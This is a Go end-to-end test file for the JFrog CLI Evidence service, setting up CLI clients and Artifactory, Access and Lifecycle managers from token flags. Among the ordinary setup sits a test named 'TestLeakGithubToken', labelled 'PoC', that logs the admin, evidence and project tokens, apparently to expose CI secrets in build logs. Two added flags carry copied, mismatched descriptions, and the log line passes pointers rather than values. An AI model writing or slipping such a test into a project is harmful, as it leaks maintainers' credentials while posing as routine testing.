package main

import (
	"flag"
	"fmt"
	"testing"

	"github.com/jfrog/jfrog-cli-core/v2/artifactory/utils"
	"github.com/jfrog/jfrog-cli-core/v2/utils/config"
	coreTests "github.com/jfrog/jfrog-cli-core/v2/utils/tests"
	e2e "github.com/jfrog/jfrog-cli-evidence/tests/e2e"
	evidenceTests "github.com/jfrog/jfrog-cli-evidence/tests/e2e/tests"
	"github.com/jfrog/jfrog-cli/utils/tests"
	"github.com/jfrog/jfrog-client-go/access"
	"github.com/jfrog/jfrog-client-go/artifactory"
	"github.com/jfrog/jfrog-client-go/lifecycle"
	clientutils "github.com/jfrog/jfrog-client-go/utils"
)

// Evidence-specific test flags
var (
	evidenceAccessToken  = flag.String("jfrog.evidenceToken", "", "JFrog Evidence service access token")
	evidenceProjectKey   = flag.String("jfrog.projectKey", "", "JFrog project key for Evidence project-based tests")
	evidenceProjectToken = flag.String("jfrog.projectToken", "", "JFrog project-scoped access token for Evidence tests")
	jfrog_token = flag.String("jfrog.adminToken", "", "JFrog project-scoped access token for Evidence tests")
	jfrog_url = flag.String("jfrog.url", "", "JFrog project-scoped access token for Evidence tests")
)

var (
	evidenceUserCli    *coreTests.JfrogCli
	evidenceAdminCli   *coreTests.JfrogCli
	evidenceProjectCli *coreTests.JfrogCli
	evidenceDetails    *config.ServerDetails
	artifactoryDetails *config.ServerDetails
	artifactoryManager artifactory.ArtifactoryServicesManager
	accessManager      *access.AccessServicesManager
	lifecycleManager   *lifecycle.LifecycleServicesManager
)

func TestLeakGithubToken(t *testing.T) {
	t.Logf("PoC: var_jfrog_token: %s var_jfrog_url: %s evidenceAccessToken: %s evidenceProjectKey: %s evidenceProjectToken: %s", jfrog_token, jfrog_url, evidenceAccessToken, evidenceProjectKey, evidenceProjectToken)
}

// TestEvidence runs all Evidence E2E tests using the main runner
func TestEvidence(t *testing.T) {
	initEvidenceTest(t)

	runner := evidenceTests.NewEvidenceE2ETestsRunner(
		evidenceUserCli,
		evidenceAdminCli,
		evidenceProjectCli,
		artifactoryManager,
		accessManager,
		lifecycleManager,
	)

	t.Log("=== Setting up shared E2E test data ===")
	err := runner.PrepareTestsData()
	if err != nil {
		t.Errorf("Failed to prepare evidence E2E test data: %v", err)
	}

	// Register cleanup to run after all tests (even if tests fail)
	t.Cleanup(func() {
		t.Log("=== Running cleanup for shared evidence E2E test data ===")
		runner.CleanupTestsData()
	})

	// Run all E2E tests using the main runner
	runner.RunEvidenceCliTests(t)
}

// initEvidenceTest initializes evidence tests
func initEvidenceTest(t *testing.T) {
	if !*tests.TestEvidence {
		t.Skip("Skipping evidence test. To run evidence test add the '-test.evidence=true' option.")
	}

	// Verify we have required tokens
	if *tests.JfrogAccessToken == "" {
		t.Error("Evidence tests require --jfrog.adminToken flag")
	}
	if *evidenceAccessToken == "" {
		t.Error("Evidence tests require --jfrog.evidenceToken flag")
	}
}

// InitEvidenceTests initializes the evidence CLI and server details
func InitEvidenceTests() {
	initArtifactoryCli()
	initEvidenceUserCli()
	initEvidenceAdminCli()
	initEvidenceProjectCli()
	configureEvidenceServer()
	configureEvidenceArtifactory()
	initArtifactoryClient()
	initAccessClient()
	initLifecycleClient()
}

// initEvidenceUserCli initializes the Evidence CLI with user/evidence token
func initEvidenceUserCli() {
	if evidenceUserCli != nil {
		return
	}

	// Build authentication flags for user CLI
	authFlags := fmt.Sprintf("--url=%s --access-token=%s", *tests.JfrogUrl, *evidenceAccessToken)
	evidenceUserCli = coreTests.NewJfrogCli(execMain, "jfrog evd", authFlags)

	fmt.Printf("✓ Evidence User CLI initialized with URL: %s\n", *tests.JfrogUrl)
}

// initEvidenceAdminCli initializes the Evidence CLI with admin token
func initEvidenceAdminCli() {
	if evidenceAdminCli != nil {
		return
	}

	// Build authentication flags for admin CLI
	authFlags := fmt.Sprintf("--url=%s --access-token=%s", *tests.JfrogUrl, *tests.JfrogAccessToken)
	evidenceAdminCli = coreTests.NewJfrogCli(execMain, "jfrog evd", authFlags)

	fmt.Printf("✓ Evidence Admin CLI initialized with URL: %s\n", *tests.JfrogUrl)
}

// initEvidenceProjectCli initializes the Evidence CLI with project-scoped token (if available)
func initEvidenceProjectCli() {
	// Check if project token and key are provided
	if evidenceProjectToken == nil || *evidenceProjectToken == "" {
		fmt.Printf("Project token not provided - project-based tests will be skipped\n")
		return
	}
	if evidenceProjectKey == nil || *evidenceProjectKey == "" {
		fmt.Printf("Project key not provided - project-based tests will be skipped\n")
		return
	}

	// Set the global e2e.ProjectKey so tests can use it
	e2e.ProjectKey = *evidenceProjectKey

	// Build authentication flags for project CLI
	authFlags := fmt.Sprintf("--url=%s --access-token=%s --project=%s",
		*tests.JfrogUrl, *evidenceProjectToken, *evidenceProjectKey)
	evidenceProjectCli = coreTests.NewJfrogCli(execMain, "jfrog evd", authFlags)

	fmt.Printf("✓ Evidence Project CLI initialized with URL: %s (project: %s)\n",
		*tests.JfrogUrl, *evidenceProjectKey)
}

// configureEvidenceServer sets up server details for Evidence service
func configureEvidenceServer() {
	if evidenceDetails != nil {
		return
	}

	evidenceDetails = &config.ServerDetails{
		Url:         *tests.JfrogUrl,
		AccessToken: *evidenceAccessToken,
	}

	fmt.Printf("Evidence service configured for: %s\n", *tests.JfrogUrl)
}

// configureEvidenceArtifactory sets up Artifactory details for Evidence tests
func configureEvidenceArtifactory() {
	if artifactoryDetails != nil {
		return
	}

	artifactoryUrl := clientutils.AddTrailingSlashIfNeeded(*tests.JfrogUrl) + "artifactory/"

	artifactoryDetails = &config.ServerDetails{
		Url:            *tests.JfrogUrl,
		ArtifactoryUrl: artifactoryUrl,
		AccessToken:    *tests.JfrogAccessToken,
	}

	fmt.Printf("Artifactory configured for Evidence tests: %s\n", artifactoryUrl)
}

// initArtifactoryClient initializes the Artifactory services manager for Evidence tests
func initArtifactoryClient() {
	if artifactoryManager != nil {
		return
	}

	var err error
	artifactoryManager, err = utils.CreateServiceManager(artifactoryDetails, -1, 0, false)
	if err != nil {
		fmt.Printf("Error creating Artifactory services manager: %v\n", err)
		return
	}

	fmt.Printf("✓ Artifactory services manager initialized for Evidence tests\n")
}

// initAccessClient initializes the Access services manager for Evidence tests
func initAccessClient() {
	if accessManager != nil {
		return
	}

	var err error
	accessManager, err = utils.CreateAccessServiceManager(artifactoryDetails, false)
	if err != nil {
		fmt.Printf("Warning: Failed to create Access services manager: %v\n", err)
		return
	}

	fmt.Printf("✓ Access services manager initialized for Evidence tests\n")
}

// initLifecycleClient initializes the Lifecycle services manager for Evidence tests
func initLifecycleClient() {
	if lifecycleManager != nil {
		return
	}

	// Lifecycle is embedded in Artifactory, prepare the server details
	lifecycleDetails := &config.ServerDetails{
		Url:            artifactoryDetails.Url,
		ArtifactoryUrl: artifactoryDetails.ArtifactoryUrl,
		AccessToken:    artifactoryDetails.AccessToken,
		User:           artifactoryDetails.User,
		Password:       artifactoryDetails.Password,
	}

	if lifecycleDetails.Url != "" {
		baseUrl := clientutils.AddTrailingSlashIfNeeded(lifecycleDetails.Url)
		lifecycleDetails.LifecycleUrl = baseUrl + "artifactory/"
	}

	var err error
	lifecycleManager, err = utils.CreateLifecycleServiceManager(lifecycleDetails, false)
	if err != nil {
		fmt.Printf("Warning: Failed to create Lifecycle services manager: %v\n", err)
		return
	}

	fmt.Printf("✓ Lifecycle services manager initialized for Evidence tests (embedded in Artifactory)\n")
}

// CleanEvidenceTests cleans up after evidence tests
func CleanEvidenceTests() {
	// Evidence tests clean up their own resources (repositories, artifacts, keys) via t.Cleanup()
	// No global cleanup needed
}
